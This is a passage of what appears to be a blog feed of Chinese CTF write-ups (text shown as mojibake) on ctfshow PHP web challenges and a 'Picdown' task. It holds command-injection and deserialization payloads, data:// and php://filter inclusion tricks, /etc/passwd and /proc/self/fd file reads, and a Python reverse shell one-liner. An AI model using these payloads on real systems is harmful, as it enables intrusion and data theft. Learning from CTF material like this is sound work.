class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®æ²¡å•¥å¥½è¯´çš„ï¼Œç›´æ¥æ­£åˆ™å›æº¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;a&#x27;</span>*<span class="number">1000002</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åä¼ å‚å³å¯</p><p>emmï¼Œè¿˜æœ‰ä¸€ç§åšæ³•</p><p>?f[]=ctfshow</p><hr><h2 id="ç‰¹æ€§ï¼špreg-matchæ•°ç»„ç»•è¿‡-preg-matchè¾“å…¥æ•°ç»„è¿”å›false"><a href="#ç‰¹æ€§ï¼špreg-matchæ•°ç»„ç»•è¿‡-preg-matchè¾“å…¥æ•°ç»„è¿”å›false" class="headerlink" title="ç‰¹æ€§ï¼špreg_matchæ•°ç»„ç»•è¿‡,preg_matchè¾“å…¥æ•°ç»„è¿”å›false"></a>ç‰¹æ€§ï¼špreg_matchæ•°ç»„ç»•è¿‡,preg_matchè¾“å…¥æ•°ç»„è¿”å›false</h2><h2 id="ç‰¹æ€§ï¼šstriposï¼ˆï¼‰è¾“å…¥æ•°ç»„è¿”å›çš„æ˜¯null"><a href="#ç‰¹æ€§ï¼šstriposï¼ˆï¼‰è¾“å…¥æ•°ç»„è¿”å›çš„æ˜¯null" class="headerlink" title="ç‰¹æ€§ï¼šstriposï¼ˆï¼‰è¾“å…¥æ•°ç»„è¿”å›çš„æ˜¯null"></a>ç‰¹æ€§ï¼šstriposï¼ˆï¼‰è¾“å…¥æ•°ç»„è¿”å›çš„æ˜¯null</h2><hr><h2 id="ç‰¹æ€§ï¼šæ­£åˆ™å›æº¯"><a href="#ç‰¹æ€§ï¼šæ­£åˆ™å›æº¯" class="headerlink" title="ç‰¹æ€§ï¼šæ­£åˆ™å›æº¯"></a>ç‰¹æ€§ï¼šæ­£åˆ™å›æº¯</h2><p>æœ‰ä¸¤ç§æ¨¡å¼ï¼šä¸€ç§æ˜¯è´ªå©ªæ¨¡å¼ï¼Œä¸€ç§æ˜¯éè´ªå©ªæ¨¡å¼</p><p>åŸç†ï¼šå¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡é»˜è®¤ä¸Šé™ï¼Œåˆ™è¿”å›falseï¼Œé»˜è®¤ä¸Šé™æ˜¯1000000</p><hr><h1 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h1><p>åŒä¸Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®ä¸»è¦æ˜¯è€ƒæŸ¥å¯¹&amp;&amp;ï¼Œ||æ‰§è¡Œé¡ºåºçš„äº†è§£</p><hr><h2 id="ç‰¹æ€§ï¼šx-amp-amp-y-å¦‚æœxä¸ºfalseåˆ™ä¸ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚x-yåªæœ‰åœ¨xä¸ºfalseçš„æƒ…å†µä¸‹æ‰å¯ä»¥æ‰§è¡Œ"><a href="#ç‰¹æ€§ï¼šx-amp-amp-y-å¦‚æœxä¸ºfalseåˆ™ä¸ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚x-yåªæœ‰åœ¨xä¸ºfalseçš„æƒ…å†µä¸‹æ‰å¯ä»¥æ‰§è¡Œ" class="headerlink" title="ç‰¹æ€§ï¼šx&amp;&amp;y,å¦‚æœxä¸ºfalseåˆ™ä¸ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚x||yåªæœ‰åœ¨xä¸ºfalseçš„æƒ…å†µä¸‹æ‰å¯ä»¥æ‰§è¡Œ"></a>ç‰¹æ€§ï¼šx&amp;&amp;y,å¦‚æœxä¸ºfalseåˆ™ä¸ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚x||yåªæœ‰åœ¨xä¸ºfalseçš„æƒ…å†µä¸‹æ‰å¯ä»¥æ‰§è¡Œ</h2><hr><blockquote><p>mt_randï¼ˆ1,0x36dï¼‰æ˜¯è¿”å›1åˆ°0x36dä¹‹é—´çš„éšæœºæ•°</p></blockquote><p>æ„é€ payload:?username=admin&amp;code=admin&amp;password=adminå³å¯</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021-8-22</title>
      <link href="/2021/08/22/2021-8-22/"/>
      <url>/2021/08/22/2021-8-22/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ–</title>
      <link href="/2021/07/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/"/>
      <url>/2021/07/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>æ„Ÿè§‰ååºåˆ—åŒ–åˆä¸ä¼šäº†ã€‚ã€‚ã€‚</p><span id="more"></span><h2>web 255</h2><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;    public $username=&#39;xxxxxx&#39;;    public $password=&#39;xxxxxx&#39;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#39;user&#39;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;</code></pre><p>åœ¨cookieé‡Œé¢ï¼Œè¿›è¡Œååºåˆ—åŒ–</p><pre><code>class ctfShowUserï¼ˆï¼‰&#123;    public $isVip=true;&#125;echo(urlencode(new ctfShowUserï¼ˆï¼‰));</code></pre><p>ç„¶å getä¼ é€’å‚æ•°</p><p>username=xxxxxx&amp;password=xxxxxx</p><h2>web 256</h2><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;    public $username=&#39;xxxxxx&#39;;    public $password=&#39;xxxxxx&#39;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!==$this-&gt;password)&#123;                    echo &quot;your flag is &quot;.$flag;              &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#39;user&#39;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;</code></pre><p>payload:</p><?php    class ctfShowUser{        public $isVip=true;         public $username='1';        public $password='2';     }    $a=new ctfShowUser();    echo(serialize($a));ç„¶å getä¼ é€’å‚æ•°username=1&password=2]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œå†æ¢ç©¶</title>
      <link href="/2021/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%86%8D%E6%8E%A2%E7%A9%B6/"/>
      <url>/2021/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%86%8D%E6%8E%A2%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>è¿™æ¬¡æƒ³æŠŠä¸œè¥¿æä¼šææ‡‚</p><span id="more"></span><h2>ä¸€äº›å¸¸ç”¨çš„å‡½æ•°</h2><pre><code>system()  æ‰§è¡Œå‘½ä»¤passthru()exec()shell_exec()popen()pcntl_exec()åå¼•å·  åŒshell_exec()eval()  æ‰§è¡Œå‘½ä»¤show_source() é«˜äº®æ˜¾ç¤ºæ–‡ä»¶highlight_file()  é«˜äº®æ˜¾ç¤ºæ–‡ä»¶array_reverse()  åå‘è¾“å‡ºå…ƒç´ pos()  è¾“å‡ºå½“å‰å…ƒç´ çš„å€¼localeconv()  è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„include  ä¸€èˆ¬ç”¨äºæ‹¬å·è¢«è¿‡æ»¤çš„æƒ…å†µï¼Œå› ä¸ºå¯ä»¥ä¸ç”¨æ‹¬å·require  ä¸€èˆ¬ç”¨äºæ‹¬å·è¢«è¿‡æ»¤çš„æƒ…å†µï¼Œå› ä¸ºå¯ä»¥ä¸ç”¨æ‹¬å·echo()  è¾“å‡ºnext()  ä¸‹ä¸€ä¸ªå…ƒç´ &lt;?php$people = array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);echo current($people) . &quot;&lt;br&gt;&quot;; // å½“å‰å…ƒç´ æ˜¯ Billecho next($people) . &quot;&lt;br&gt;&quot;; // Bill çš„ä¸‹ä¸€ä¸ªå…ƒç´ æ˜¯ Steveecho current($people) . &quot;&lt;br&gt;&quot;; // ç°åœ¨å½“å‰å…ƒç´ æ˜¯ Steveecho prev($people) . &quot;&lt;br&gt;&quot;; // Steve çš„ä¸Šä¸€ä¸ªå…ƒç´ æ˜¯ Billecho end($people) . &quot;&lt;br&gt;&quot;; // æœ€åä¸€ä¸ªå…ƒç´ æ˜¯ Davidecho prev($people) . &quot;&lt;br&gt;&quot;; // David ä¹‹å‰çš„å…ƒç´ æ˜¯ Markecho current($people) . &quot;&lt;br&gt;&quot;; // ç›®å‰çš„å½“å‰å…ƒç´ æ˜¯ Markecho reset($people) . &quot;&lt;br&gt;&quot;; // æŠŠå†…éƒ¨æŒ‡é’ˆç§»åŠ¨åˆ°æ•°ç»„çš„é¦–ä¸ªå…ƒç´ ï¼Œå³ Billecho next($people) . &quot;&lt;br&gt;&quot;; // Bill çš„ä¸‹ä¸€ä¸ªå…ƒç´ æ˜¯ Steveprint_r (each($people)); // è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼ˆç›®å‰æ˜¯ Steveï¼‰ï¼Œå¹¶å‘å‰ç§»åŠ¨å†…éƒ¨æŒ‡é’ˆ?&gt;</code></pre><h2>web29</h2><p>evalæ˜¯ä»£ç æ‰§è¡Œå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¾“å…¥ä¸€æ®µphpä»£ç </p><p>?c=system(â€˜cat fla?.phpâ€™);</p><p>?æ˜¯å ä½ç¬¦ï¼Œè¡¨ç¤ºä»£æ›¿ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥ç”¨<em>ä»£æ›¿ï¼Œ</em>è¡¨ç¤ºä»£æ›¿ä¸€ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦</p><pre><code>echo `nl fl&#39;&#39;ag.php`;</code></pre><p>é¢˜ç›®ç»™çš„hintæ˜¯è¿™ä¸ªï¼Œä»¥å‰æ€»æ˜¯ä¸ç†è§£è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Œå°±æ˜¯è¯´ ``,æ˜¯å‘½ä»¤ç½®æ¢çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œshellå…ˆæ‰§è¡Œäº†åå¼•å·é‡Œé¢çš„å‘½ä»¤ï¼Œç„¶åå°†å‘½ä»¤çš„è¾“å‡ºç»“æœå…ˆä¿å­˜èµ·æ¥äº†ï¼Œç„¶åæˆ‘ä»¬é‡‡ç”¨echoå°†å…¶è¾“å‡º</p><p>evalåœ¨æˆ‘ç†è§£å°šå°±æ˜¯è¯´ç›¸å½“äºä¸€ä¸ªphpçš„ç¼–è¯‘å™¨ï¼Œæ‰§è¡Œé‡Œé¢çš„ä»£ç ï¼Œæ‰€ä»¥è¦ç”¨ï¼›ç»“å°¾ï¼Œè¡¨ç¤ºä¸€ä¸ªå®Œæ•´çš„phpè¯­å¥ã€‚å¯ä»¥ç”¨å•å¼•å·åˆ†éš”æ¥ç»•è¿‡è¿‡æ»¤ï¼Œå¦‚æœæƒ³è¦åœ¨systemé‡Œé¢ä½¿ç”¨å•å¼•å·ï¼Œéœ€è¦system(â€œnl flaâ€™â€™g.phpâ€);</p><p>è¿™é‡Œé¢file_get_contents,highlight_file,readfileéƒ½ä¸èƒ½ä½¿ç”¨</p><p>ç„¶ååœ¨phpä»£ç çš„æœ€åä¸€è¡Œä»£ç å¯ä»¥ä¸ç”¨åˆ†å·ï¼Œæ‰€ä»¥å½“é‡åˆ°ä»£ç æ‰§è¡Œçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨<code>ï¼Ÿ&gt;</code>æ¥ä»£æ›¿åˆ†å·</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¾“å…¥systemï¼ˆâ€˜nl fla?.phpâ€™ï¼‰?&gt;æ¥ä»£æ›¿åˆ†å·</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨cpå‘½ä»¤ï¼Œsystem(â€œcp fla*.php 1.txtâ€);å°†flag.phpå¤åˆ¶åˆ°1.txt</p><h2>web 30</h2><p>è¿‡æ»¤systemï¼Œflagï¼Œphpï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨echoå‘½ä»¤</p><pre><code>echo `nl f*`;</code></pre><p>ç„¶åechoå¯ä»¥ç”¨çŸ­æ ‡ç­¾ä»£æ›¿&lt;?=ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¾“å…¥å‘½ä»¤    </p><pre><code>?&gt;&lt;?=`nl f*`;</code></pre><p>ç„¶åæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨</p><pre><code>`cp fla* 1.txt`;</code></pre><h2>web 31</h2><p>é‡‡ç”¨äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•</p><pre><code>include(&quot;$_GET[1]&quot;);&amp;1=php://filter/read=convert.base64-encode/resource=flag.phpï¼ˆè¿™æ ·é‡Œé¢ä¸ä¼šå‡ºç°ç©ºæ ¼ï¼‰eval(&quot;$_GET[1]&quot;);&amp;1=system(&quot;cat flag.php&quot;);//ä¸Šé¢ä¸¤ç§æ–¹æ³•è¿˜æ˜¯è¯´æ˜äº†é‚£ä¸ªevalæ˜¯ä»£ç æ‰§è¡Œï¼Œå¯ä»¥æ‰§è¡Œä¸€æ®µä»£ç </code></pre><p>ä¸çŸ¥é“ä¸ºå•¥è¿™é“é¢˜ç›®ç©ºæ ¼ç»•è¿‡ä¸æˆåŠŸï¼Œç¾¤ä¸»ç»™çš„hintæ˜¯æ— å‚æ•°rce</p><p>å…ˆçœ‹ä½ç½®</p><p>print_r(scandir(â€˜.â€™))-&gt;print_r(scandir(current(localeconv())));</p><p>åœ¨å€’æ•°ç¬¬äºŒä½</p><p>ç„¶åä½¿ç”¨</p><p>show_source(next(array_reverse(scandir(current(localconv())))));</p><p>å¦‚æœä¸æ˜¯æ— å‚æ•°rceæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨è¿™ä¸ªprint_r(scandir(dirname(<strong>FILE</strong>)));ï¼ˆdirname(<strong>FILE</strong>)è¿”å›è„šæœ¬æ‰€åœ¨çš„ç›®å½•ï¼‰</p><h2></h2><p>è¿™é‡Œå­¦åˆ°äº†ä¸€ä¸ªå°tipsï¼Œincludeæ˜¯å¯ä»¥ä¸è¦ï¼ˆï¼‰çš„</p><p>include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</p><p>?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php phpinfo();?></p><p>å¯ä»¥é‡‡ç”¨dataåè®®</p><p>çœ‹ç¾¤ä¸»çš„è§†é¢‘æ˜¯åœ¨include%0a$_GET[1]?&gt;ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨require%0a$_GET[1]?&gt;</p><p>ä½†æ˜¯åœ¨æˆ‘ç”µè„‘ä¸Šä¸€ç›´æ²¡æœ‰èƒ½æˆï¼Œæˆ‘æ„Ÿè§‰æ˜¯ç©ºæ ¼çš„é—®é¢˜ï¼Œåœ¨bpä¸Šåº”è¯¥å¯ä»¥ï¼Œç„¶åé‚£ä¸ªrequireä¹Ÿå¯ä»¥ï¼Œä¸ç”¨ç”¨æ‹¬å·ï¼Œç©ºæ ¼</p><h2>wen 32,33ï¼Œ34ï¼Œ35ï¼Œ36åŒä¸Š</h2><p>è¯­è¨€ç»“æ„æœ‰ï¼šecho,print,isset,unset,include,requireè¿™å‡ ç§ï¼Œè¿™äº›æ˜¯ä¸éœ€è¦æ‹¬å·çš„</p><p>å¹¶ä¸”$_GET[a],è¿™é‡Œé¢çš„aæ˜¯ä¸éœ€è¦æœ‰å•å¼•å·çš„ï¼ŒåŸå› æ˜¯phpå‘ä¸‹å…¼å®¹ã€‚ä»¥åè¿™ç§å†™æ³•å¯èƒ½ä¼šè¢«å–æ¶ˆ</p><h2>web 37</h2><pre><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbGFnLnBocCcpOz8+</code></pre><p>dataåè®®ï¼Œå°±æ˜¯dataåè®®å°±æ˜¯å°†åé¢çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²å½“æ—¶phpä»£ç æ¥æ‰§è¡Œ</p><p>æˆ‘ä¸€å¼€å§‹æƒ³çš„æ˜¯?c=$_GET[1]&amp;1=/etc/passwdä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼ŒåŸå› æ˜¯includeå°†$_GET[1]å½“æˆäº†å­—ç¬¦ä¸²æ¥æ‰§è¡Œï¼Œä¸èƒ½å°†å…¶åŠè¿›è¡Œè§£æ</p><h2>web 38</h2><p>ç”¨é‚£ä¸ªdataï¼Œbase64çš„ä¾ç„¶å¯ä»¥ï¼Œç„¶åç”¨çŸ­æ ‡ç­¾ä¹Ÿå¯ä»¥ç»•è¿‡</p><h2>web 39</h2><p>ä¾ç„¶æ˜¯dataä¼ªåè®®</p><p>ä¸ºä»€ä¹ˆä¼šåœ¨ç•Œé¢å•†è¿”å›äº†1.phpæ˜¯å› ä¸ºphpinfoï¼ˆï¼‰ï¼›çš„è¿”å›å€¼æ˜¯1ï¼Œæ‰€ä»¥è¿”å›äº†1.php</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Picdown</title>
      <link href="/2021/06/25/Picdown-1/"/>
      <url>/2021/06/25/Picdown-1/</url>
      
        <content type="html"><![CDATA[<p>&lt;â€“moreâ€“&gt;</p><p>ç‰¹å¾ï¼šæ‰“å¼€é¢˜ç›®æœ‰è¾“å…¥æ¡†<br>éšä¾¿æµ‹è¯•è¾“å…¥1ï¼Œå‘ç°urlå˜ä¸º?url=1,å°è¯•è¾“å…¥/etc/passwdå‘ç°æœ‰ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œç„¶åä½¿ç”¨ç„¶åå°è¯•è¯»å–/flagï¼Œå¾—åˆ°flagï¼Œè¿™æ˜¯éé¢„æœŸè§£</p><p>é¢„æœŸè§£é‡Šï¼š</p><p>æŸ¥å®è¯»å–è¿›ç¨‹ï¼š/proc/self/cmdline,å‘ç°æœ‰app.pyï¼Œå°è¯•è¯»å–ï¼ŒçŸ¥é“æˆ‘ä»¬éœ€è¦åšçš„æ˜¯æ‰¾åˆ°é‚£ä¸ªå¯†é’¥ï¼Œä½†æ˜¯å­˜åœ¨å¯†é’¥çš„æ–‡ä»¶è¢«åˆ é™¤äº†ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°é‚£ä¸ªè¢«åˆ é™¤çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°å¯†é’¥ã€‚</p><p>è¿™é‡Œå­¦åˆ°äº†ä¸€ä¸ªå‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨proc/self/fd/(1,2,3)â€¦æ¥è¿›è¡Œè¯»å–</p><p>G2VxV+vYRoO3BvEJukrCz71nYHYM71GJTjL2cOtrKr0=</p><p>å¯ä»¥ä½¿ç”¨bpçˆ†ç ´</p><p>å¾ˆå¥‡æ€ªï¼Œæˆ‘æŠŠkeyæä¸Šå»æç¤ºè¯´åˆ°ï¼Œkeyé”™è¯¯ã€‚ã€‚ã€‚é”™è¯¯å°±è¿›è¡Œurlç¼–ç ï¼Œæœ‰æ—¶å€™å°±å¾ˆä¸æ˜ç™½å•¥æ—¶å€™è¦ç¼–ç ï¼Œå•¥æ—¶å€™ä¸è¦ç¼–ç </p><p>ç„¶åæ‰§è¡Œlsï¼Œå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå°±å¯èƒ½æ˜¯åå¼¹shell</p><p>åå¼¹shellåŸç†ï¼š</p><p>æ”»å‡»è€…è¿›è¡Œç›‘å¬ï¼Œå¼€å¯tcpæœåŠ¡</p><p>è¢«æ”»å‡»è€…è¿æ¥ç«¯å£    TCPæœåŠ¡</p><p>ä¸¤è€…å»ºç«‹TCPè¿æ¥</p><p>Aé€šè¿‡TCPæœåŠ¡å°†å¾…æ‰§è¡Œå‘½ä»¤å‘é€ç»™B</p><p>Bæ‰§è¡Œå‘½ä»¤åå°†ç»“æœä¼ é€’ç»™A</p><p>è¯­å¥ï¼š</p><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>æ•´ç†ä¸€ä¸‹</p><pre><code>import socket,subprocess(å®ƒå…è®¸ä½ ç”Ÿæˆæ–°çš„è¿›ç¨‹ï¼Œè¿æ¥åˆ°å®ƒä»¬çš„ input/output/error ç®¡é“ï¼Œå¹¶è·å–å®ƒä»¬çš„è¿”å›ï¼ˆçŠ¶æ€ï¼‰ç ),oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)//ä½¿ç”¨socketå‡½æ•°åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼ŒAF_INETè¡¨ç¤ºæ˜¯ä¸€ä¸ªIPv4çš„å¥—æ¥å­—ï¼ŒSOCK_STREAMè¡¨ç¤ºä½¿ç”¨TCPæµå¼sockets.connect((&quot;IP&quot;,ç«¯å£))//è¿æ¥åˆ°ipçš„å¥—æ¥å­—os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)//æ‰€ä»¥ä¸Šé¢çš„å‡½æ•°ä½œç”¨å°±æ˜¯æŠŠstdin,stdout,stderrçš„å†…å®¹æ›¿æ¢ä¸ºå¥—æ¥å­—è¿”å›çš„å†…å®¹ï¼Œæ‰€ä»¥åœ¨æœ¬æœºncç›‘å¬å°±ä¼šåˆ›å»ºä¸€ä¸ªå¥—æ¥å­—è¿›ç¨‹ï¼Œæ˜¯çš„åœ¨æœ¬åœ°è¾“å…¥çš„å†…å®¹å°±ç›´æ¥ä½œä¸ºå®¿ä¸»æœºçš„stdinï¼Œstdoutçš„å†…å®¹ä¹Ÿä¼šåœ¨æœ¬åœ°æ˜¾ç¤ºp=subprocess.call(å°±æ˜¯æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œè¿”å›å‘½ä»¤æ‰§è¡Œçš„çŠ¶æ€ç )([&quot;/bin/sh&quot;,&quot;-i&quot;])</code></pre><p>ç„¶åè¿æ¥åå¼¹å³å¯ï¼Œä½†æ˜¯æˆ‘è¿æ¥ä¸ä¸Šã€‚ã€‚ã€‚</p><p>#åè®°</p><p>å­¦åˆ°äº†</p><p>çŸ¥è¯†ç‚¹ï¼šä»»æ„æ–‡ä»¶è¯»å–</p><p>ç•Œé¢å‡ºç°?url=ï¼Œå¹¶ä¸”è¾“å…¥/etc/passwdæœ‰ä¼šæ˜¾</p><p>/proc/self/cmdline æŸ¥çœ‹è¿›ç¨‹</p><p>proc/self/fd/(1,2,3,4)æ–‡ä»¶æè¿°ç¬¦ï¼Œé¢˜ç›®ä¸­æ˜¯ç”¨openæ‰“å¼€çš„ï¼Œäºæ˜¯ä¼šåˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡/proc/self/fd/(1,2,3,4)å»æŸ¥æ‰¾</p><p>ç„¶åkeyé”™è¯¯ï¼Œè®°å¾—ç¼–ç </p><p>ç„¶åå› ä¸ºæ‰§è¡Œå‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥è¦è¿›è¡Œåå¼¹shell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPçš„Smartyæ¨¡æ¿</title>
      <link href="/2021/06/25/PHP%E7%9A%84Smarty%E6%A8%A1%E6%9D%BF/"/>
      <url>/2021/06/25/PHP%E7%9A%84Smarty%E6%A8%A1%E6%9D%BF/</url>
      
